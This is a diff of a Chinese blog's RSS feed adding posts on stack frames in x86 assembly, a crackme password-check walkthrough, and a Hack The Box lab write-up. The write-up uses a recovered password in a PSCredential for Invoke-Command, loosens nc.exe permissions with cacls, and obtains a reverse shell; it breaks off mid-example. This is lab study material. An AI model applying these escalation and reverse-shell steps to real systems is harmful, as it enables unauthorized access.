@@ -5,9 +5,305 @@
     <description></description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Wed, 11 Mar 2020 02:27:50 +0800</pubDate>
-    <lastBuildDate>Wed, 11 Mar 2020 02:27:50 +0800</lastBuildDate>
+    <pubDate>Mon, 23 Mar 2020 19:15:08 +0800</pubDate>
+    <lastBuildDate>Mon, 23 Mar 2020 19:15:08 +0800</lastBuildDate>
     <generator>Jekyll v4.0.0</generator>
+    
+      <item>
+        <title>通过画堆栈图解析汇编中函数调用的过程</title>
+        <description>&lt;h1 id=&quot;堆栈图解析汇编中函数调用的过程&quot;&gt;堆栈图解析汇编中函数调用的过程&lt;/h1&gt;
+
+&lt;h2 id=&quot;c语言中的函数&quot;&gt;C语言中的函数&lt;/h2&gt;
+
+&lt;p&gt;三个关键点：局部变量、参数、函数返回值&lt;/p&gt;
+
+&lt;p&gt;下面是示例程序&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;#include &quot;stdafx.h&quot;
+int Plus(int x, int y)
+{
+  int z = 2;
+  return x+y+z;
+}
+int main(int argc, char* argv[])
+{
+  int r = Plus(3, 4);
+  return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;画堆栈图&quot;&gt;画堆栈图&lt;/h2&gt;
+
+&lt;p&gt;esp ：栈顶&lt;/p&gt;
+
+&lt;p&gt;ebp：栈底&lt;/p&gt;
+
+&lt;p&gt;对于函数调用，先压入参数，再执行 call&lt;/p&gt;
+
+&lt;p&gt;对于参数，从右向左依次压入堆栈（stdcall 模式）
+因此，本程式先压入 4，再压入 3&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;调用前的堆栈&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd3p8dc1t4j325o0nmqv5.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.15.54&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2lwdkvvwj30f60f2taw.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.18.00&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;PUSH 4
+PUSH 3
+向栈内压入 4 ，esp - 4 ，eip 向下一条
+向栈内压入 3 ，esp - 4 ，eip 向下一条&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2lx949zyj30he0jo0ve.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.23.20&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;call 指令&lt;/p&gt;
+
+    &lt;p&gt;一般的 mov 等指令无法改变 eip 的值，但是 call 可以
+	&lt;code class=&quot;highlighter-rouge&quot;&gt;call 00401005&lt;/code&gt;：
+	     a. 将 eip 的值改为函数所在的地址 0x00401005
+	     b. 将函数的 ret address 压入堆栈保存&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m0pib7cj30ta0pm45c.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.32.09&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;进入函数后，保留现场，划分堆栈&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m1l7hk7j311s0hkav4.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.34.12&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;PUSH EBP&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m2fqsinj30go0ictc7.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.35.57&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;保存原栈底位置&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;提升堆栈，创建缓冲区&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m4p7enkj30u00wzqcb.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.40.04&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;紫色部分即为“缓冲区”&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m5fhsm6j30hm0scwhx.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.40.34&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;填充缓冲区&lt;/p&gt;
+
+    &lt;p&gt;&lt;em&gt;LEA EDI ，DWORD PTR SS : [EBP - 44]&lt;/em&gt;   （EDI中存放缓冲区的最顶地址）
+&lt;em&gt;MOV ECX ,11&lt;/em&gt;
+&lt;em&gt;MOV EAX , CCCCCCCC&lt;/em&gt;
+&lt;em&gt;REP STOS DWORD PTR ES : [EDI]&lt;/em&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m7ohlahj30jo0z2wso.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.48.41&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;定义局部变量&lt;/p&gt;
+
+    &lt;p&gt;一般情况下：
+	ebp - n 是局部变量
+	ebp + n 是参数&lt;/p&gt;
+
+    &lt;p&gt;​	&lt;code class=&quot;highlighter-rouge&quot;&gt;EBP + 4&lt;/code&gt; 是返回地址（因此凡是想修改 ebp + 4 的指令都必须小心）&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m9fjromj30qy0mqafp.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.50.53&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;执行加法&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2math8skj30p40oeq9s.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.55.12&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;EAX 存放函数返回值&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;恢复堆栈&lt;/p&gt;
+
+    &lt;p&gt;&lt;em&gt;MOV ESP ，EBP&lt;/em&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2mbd4xfrj30nc0lw0xg.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.58.17&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;em&gt;POP EBP&lt;/em&gt;       恢复栈底&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2mbx4qz3j30k80l8dk7.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.58.47&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;ret 指令&lt;/p&gt;
+
+    &lt;p&gt;将堆栈中 函数的返回地址 pop 到 eip 中&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2md8xy7wj30sc0ru45v.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午10.10.51&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;em&gt;ADD ESP ，8&lt;/em&gt;      &lt;em&gt;平衡堆栈&lt;/em&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2mdr9rebj30wu058jya.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午10.10.21&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        <pubDate>Sun, 22 Mar 2020 08:28:00 +0800</pubDate>
+        <link>http://localhost:4000/2020/03/22/%E5%A0%86%E6%A0%88%E5%9B%BE%E8%A7%A3%E6%9E%90%E6%B1%87%E7%BC%96%E4%B8%AD%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E8%BF%87%E7%A8%8B/</link>
+        <guid isPermaLink="true">http://localhost:4000/2020/03/22/%E5%A0%86%E6%A0%88%E5%9B%BE%E8%A7%A3%E6%9E%90%E6%B1%87%E7%BC%96%E4%B8%AD%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E8%BF%87%E7%A8%8B/</guid>
+        
+        <category>逆向</category>
+        
+        <category>汇编</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>从简单破解学到的汇编基础</title>
+        <description>&lt;h1 id=&quot;从简单破解学到的汇编基础&quot;&gt;从简单破解学到的汇编基础&lt;/h1&gt;
+
+&lt;h2 id=&quot;基本汇编指令复习&quot;&gt;基本汇编指令复习&lt;/h2&gt;
+
+&lt;h3 id=&quot;lea-与-mov-与-&quot;&gt;lea 与 mov 与 []&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;lea 指令&lt;/p&gt;
+
+    &lt;p&gt;第二个操作数可以是寄存器或者变量&lt;/p&gt;
+
+    &lt;p&gt;若为&lt;strong&gt;寄存器&lt;/strong&gt;：必须加 [] ，相当于取值操作&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;mov eax, 2
+lea ebx, [eax]		;执行后 ebx = 2
+mov ebx, eax			;等同于上句
+lea ebx, eax			;编译器报错: error A2070: invalid 			    instruction operands
+&lt;/code&gt;&lt;/pre&gt;
+
+    &lt;p&gt;优点：&lt;/p&gt;
+
+    &lt;blockquote&gt;
+      &lt;p&gt;lea 可以作简单的算术计算，特别是有了32位指令的增强寻址方式，比如要算EAX*4+EBX+3，结果放入 EDX，怎么办？&lt;/p&gt;
+
+      &lt;p&gt;mov  edx,  eax&lt;br /&gt;
+ shl  edx,  2&lt;br /&gt;
+ add  edx,  ebx&lt;br /&gt;
+ add  edx,  3&lt;/p&gt;
+
+      &lt;p&gt;现在用 lea 一条指令搞定： 
+ lea  edx,  [ebx + eax * 4 + 3]&lt;/p&gt;
+    &lt;/blockquote&gt;
+
+    &lt;p&gt;注意：&lt;/p&gt;
+
+    &lt;p&gt;​	在函数执行时，经常会看到这种指令：&lt;code class=&quot;highlighter-rouge&quot;&gt;lea esi, [ebp-30]&lt;/code&gt; 用于获取局部变量的地址；注意不能用 OFFSET 获得堆栈参数的地址，因为 OFFSET 只适用于编译时已知的地址。下面的语句无法汇编：&lt;/p&gt;
+
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mov esi,OFFSET [ebp-30 ]  ;错误&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;若为&lt;strong&gt;变量&lt;/strong&gt;：有无 [] 都一样，为取地址操作，相当于 C语言中的 &amp;amp;&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;num dword 2
+lea ebx, num
+lea eax, [num]		; eax 为 num 的地址,如 eax = 4206598,随程序不同不同,这时 ebx = eax
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;mov 指令&lt;/p&gt;
+
+    &lt;p&gt;若第二个操作数为&lt;strong&gt;变量&lt;/strong&gt;：有无 [] 都一样&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;num dword 2
+mov eax, 2
+mov ebx, num
+mov ecx, [num]		;执行完 ebx = ecx = 2
+&lt;/code&gt;&lt;/pre&gt;
+
+    &lt;p&gt;若第二个操作数为&lt;strong&gt;寄存器&lt;/strong&gt;：加 [] 表示将其内存地址中的值传值&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;mov ecx,[eax]			; 相当于 mov ecx, ds:[eax]，将内存地址为 eax 处的值传给 ecx
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;set-指令&quot;&gt;set 指令&lt;/h3&gt;
+
+&lt;p&gt;作用为根据EFLAGS寄存器中的状态标识设置目标操作数的值为 0 或 1。目标操作数指向一个字节寄存器或内存中的一字节。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;sete(setz) al		; 取当前标志寄存器中 ZF 的值，放到 AL 中
+setne(setnz) al  ; 取得 ZF 值后，取反，再放到 AL 中。
+其中 e 表示 equal （相等）
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;经常接在会改变标志寄存器的指令之后，这样就省去了条件跳转&lt;/p&gt;
+
+&lt;h3 id=&quot;cmov-指令&quot;&gt;cmov 指令&lt;/h3&gt;
+
+&lt;p&gt;条件传送表示要满足某个或某些条件时才执行传送数据。&lt;/p&gt;
+
+&lt;p&gt;条件传送传送数据的格式为： cmovx src, dst&lt;/p&gt;
+
+&lt;p&gt;前面的字母c为英文condition（意思是条件）的首字母，后面的x表示条件，不同的条件有不同的表示，通常是一到三个字母&lt;/p&gt;
+
+&lt;p&gt;cmovne/cmovnz 表示 ZF = 0 时传送数据&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;mov eax, 2
+cmp eax, 2
+cmovne ebx, 3 ; 因为 cmp 指令执行后，ZF = 1，因此 3 不会被传给 ebx
+即不相等时才传值
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;参考链接：&lt;a href=&quot;https://www.cnblogs.com/kenzhang1031/p/3428623.html#s4&quot;&gt;条件传送数据cmov指令&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;05-初试破解-控制台-汇编程序解读&quot;&gt;05 初试破解-控制台 汇编程序解读&lt;/h2&gt;
+
+&lt;p&gt;其实稍微有点经验的一看就知道这是个密码验证过程，且一下就能发现密码的 ascii&lt;/p&gt;
+
+&lt;p&gt;但我还是想把每一条指令都搞明白，记录一下&lt;/p&gt;
+
+&lt;p&gt;（因为 OD 版本不同，所以这里指令看上去和视频里不一样，这个无所谓）&lt;/p&gt;
+
+&lt;p&gt;（假设用户输入就是密码 rkvir）&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;lea eax,[local.14]	; 取局部变量的地址到 eax
+push eax						; 将 eax 压栈
+push 0046D6B8       ; 压入C语言的格式符 %s
+call scanf					; 获取用户输入，以上这就是函数调用的过程
+mov eax,[local.14]	; 将局部变量的值传给 eax
+xor edx,edx					
+add esp,0x18				; 平栈
+cmp al,0x72					; 比较密码的第一位，ZF=1
+sete dl							; edx = 1
+cmp ah,0x6B					; 比较第二位，ZF=1
+lea ecx,dword ptr ds:[edx+0x1]	; ecx = 1+1 = 2
+cmovne ecx,edx			; 因为 ZF=1，因此不传值，ecx 不变
+cmp byte ptr ss:[ebp-0x36],0x76		; 比较第三位，ZF=1
+lea eax,dword ptr ds:[ecx+0x1]		; eax = 2+1 = 3
+cmovne eax,ecx			; 因为 ZF=1，因此不传值
+cmp byte ptr ss:[ebp-0x35],0x69 	; 同上
+lea ecx,dword ptr ds:[eax+0x1]
+cmovne ecx,eax
+cmp byte ptr ss:[ebp-0x34],0x72
+lea edx,dword ptr ds:[ecx+0x1]
+cmovne edx,ecx
+cmp byte ptr ss:[ebp-0x33],0x0
+lea eax,dword ptr ds:[edx+0x1]
+cmovne eax,edx
+cmp eax,0x5
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这里一开始不明白为什么一个简单的比较字符串的程序这么冗长，后来才发现这就是故意设置的，其中 ecx edx eax 相互增加的过程就是原C程序的 nflag 增加的过程。如果某一位密码错误，eax 都不会顺利地增加到 6，则登录失败&lt;/p&gt;
+</description>
+        <pubDate>Sat, 21 Mar 2020 08:28:00 +0800</pubDate>
+        <link>http://localhost:4000/2020/03/21/%E8%A7%86%E9%A2%9105%E7%AC%94%E8%AE%B0/</link>
+        <guid isPermaLink="true">http://localhost:4000/2020/03/21/%E8%A7%86%E9%A2%9105%E7%AC%94%E8%AE%B0/</guid>
+        
+        <category>逆向</category>
+        
+        <category>汇编</category>
+        
+        
+      </item>
     
       <item>
         <title>Hackthebox Sniper writeup/Walkthrough/攻略</title>
@@ -18,6 +314,166 @@
         <guid isPermaLink="true">http://localhost:4000/2020/03/11/HTB-Sniper/</guid>
         
         <category>HTB</category>
+        
+        <category>渗透测试</category>
+        
+        <category>WINDOWS 提权</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>利用 PSCredential 越权反弹 shell</title>
+        <description>&lt;h2 id=&quot;题目设定与前提&quot;&gt;题目设定与前提&lt;/h2&gt;
+
+&lt;p&gt;近期做 HTB 学习到了一些 WINDOWS 越权执行的知识，通过前期信息收集与渗透，目前我们已经通过 webshell 新建一了个临时目录 Temp，并上传了 nc.exe 拿到了靶机中的普通用户权限。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcoxf4sjpyj30im060gms.jpg&quot; alt=&quot;image-20200310164628331&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;同时还从 db.php 发现了一个 dbuser 的凭证&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcoszxr5pqj31460ektcf.jpg&quot; alt=&quot;Xnip2020-03-09_01-44-55 2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;查看用户组，发现这是用户 “Chris” 的凭证。现在我们需要做的就是要越权到用户 Chris 目录下&lt;/p&gt;
+
+&lt;h2 id=&quot;生成-pscredential-对象&quot;&gt;生成 PSCredential 对象&lt;/h2&gt;
+
+&lt;p&gt;很多 Powershell 的 cmdlet 可以添加一个 PSCredential 的对象，用于使用特定用户运行 cmdlet。有两种方式生成 PSCredential 对象&lt;/p&gt;
+
+&lt;h3 id=&quot;方法一&quot;&gt;方法一&lt;/h3&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-Credential&lt;/code&gt; 命令，会让输入用户名和密码，这种方式可以被用于交互式模式下&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcouvm8y5lj319v0u0dnz.jpg&quot; alt=&quot;Xnip2020-03-10_15-16-41&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcouvqvo29j31aq0p00zp.jpg&quot; alt=&quot;Xnip2020-03-10_15-18-21&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;方法二&quot;&gt;方法二&lt;/h3&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;大多数情况下，你不会希望在交互模式下生成 &lt;code class=&quot;highlighter-rouge&quot;&gt;credential objects&lt;/code&gt;，因为这样无法在脚本或自动化工具中使用&lt;/p&gt;
+
+&lt;p&gt;为此我们需要先生成一个包含密码的 &lt;code class=&quot;highlighter-rouge&quot;&gt;secure string&lt;/code&gt;，之后将 &lt;code class=&quot;highlighter-rouge&quot;&gt;secure string&lt;/code&gt; 和用户名传给 &lt;code class=&quot;highlighter-rouge&quot;&gt;System.Management.Automation&lt;/code&gt; 的 PSCredential 方法&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;具体操作&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nv&quot;&gt;$secpasswd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ConvertTo-SecureString &lt;span class=&quot;s2&quot;&gt;&quot;PlainTextPassword&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-AsPlainText&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$creds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New-Object System.Management.Automation.PSCredential &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$secpasswd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;下面我们分析一下上述 cmdlets&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ScureStrings&lt;/code&gt; 是微软在 2.0 版本的 .NET 中引进的一个类，相比于传统 Strings 类更适合用于密码等加密信息，其新特性为：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;不再是不可改变的&lt;/li&gt;
+  &lt;li&gt;可被人工销毁&lt;/li&gt;
+  &lt;li&gt;不再会在内存中已明文保存密码，防止被内存提取&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ConvertTo-SecureString -AsPlainText&lt;/code&gt; 可以将密码以明文储存进 &lt;code class=&quot;highlighter-rouge&quot;&gt;secure string&lt;/code&gt;，但 &lt;code class=&quot;highlighter-rouge&quot;&gt;-Force&lt;/code&gt; 选项是必需的，因为明文存储本身是危险的，会被禁止&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;New-Object System.Management.Automation.PSCredential (&quot;username&quot;, $secpasswd)&lt;/code&gt; 生成一个 PSCredential 对象，用于后续 cmdlets 的执行&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.quickstart.com/blog/powershell-credentials-and-securestrings-part-i/&quot;&gt;powershell-credentials-and-securestrings&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://duffney.io/AddCredentialsToPowerShellFunctions#with-credentials-in-a-variable&quot;&gt;How to Add Credential Parameters to PowerShell Functions&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcowstksurj31e40gmq7v.jpg&quot; alt=&quot;image-20200310162500289&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;invoke-command-远程执行反弹-shell&quot;&gt;Invoke-Command 远程执行反弹 shell&lt;/h2&gt;
+
+&lt;p&gt;Invoke-Command 可以远程执行 cmdlets，具体操作如下&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Invoke-Command –ComputerName MyServer1 &lt;span class=&quot;nt&quot;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+Invoke-Command –ComputerName MyServer1 &lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt; demo&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;erveradmin &lt;span class=&quot;nt&quot;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcoxd2zlysj31e808c431.jpg&quot; alt=&quot;image-20200310164428895&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这样实际上我们已经成功越权获得另一个用户 Chris 的权限，下面我们尝试反弹 Chris 的 shell 获得更方便的利用&lt;/p&gt;
+
+&lt;p&gt;直接利用之前上传的 nc 反弹，显示权限不足&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcoz60ih12j31e40fkjz6.jpg&quot; alt=&quot;Xnip2020-03-10_17-46-10&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;有两个方法解决&lt;/p&gt;
+
+&lt;h3 id=&quot;方法一-1&quot;&gt;方法一&lt;/h3&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;修改 nc.exe 的权限，允许任意用户直接运行&lt;/p&gt;
+
+&lt;p&gt;首先查看 nc.exe 原本的权限&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcoz8shjbxj313e0d6q58.jpg&quot; alt=&quot;image-20200310174933649&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;修改权限&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cacls nc.exe /t /e /g everyone:f&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/t&lt;/code&gt; 表示修改文件夹及子文件夹中所有文件的ACL.
+&lt;code class=&quot;highlighter-rouge&quot;&gt;/e &lt;/code&gt;表示仅做编辑工作而不替换.
+&lt;code class=&quot;highlighter-rouge&quot;&gt;/c &lt;/code&gt;表示在出现拒绝访问错误时继续.
+&lt;code class=&quot;highlighter-rouge&quot;&gt;/g every:f&lt;/code&gt;表示给予本地所有用户以完全控制的权限.
+&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;f&quot;&lt;/code&gt;代表完全控制，如果只是希望给予读取权限，那么应当是 &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;r&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;再次查看权限，发现权限修改成功&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcozd0t1dpj313c0gutbs.jpg&quot; alt=&quot;image-20200310175336704&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;重新远程反弹 shell&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcozfpha0rj31e60imwmq.jpg&quot; alt=&quot;image-20200310175612690&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;成功获取用户 Chris 的 shell&lt;/p&gt;
+
+&lt;h3 id=&quot;方法二-1&quot;&gt;方法二&lt;/h3&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;既然默认用户下的 nc 无权运行，那就向用户 Chris 上传一个新的 nc&lt;/p&gt;
+
+&lt;p&gt;先了解一下 &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-WebRequest&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;相当于 &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; 命令，获取 http 的请求访问内容&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;语法Syntax&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Parameter Set: Default
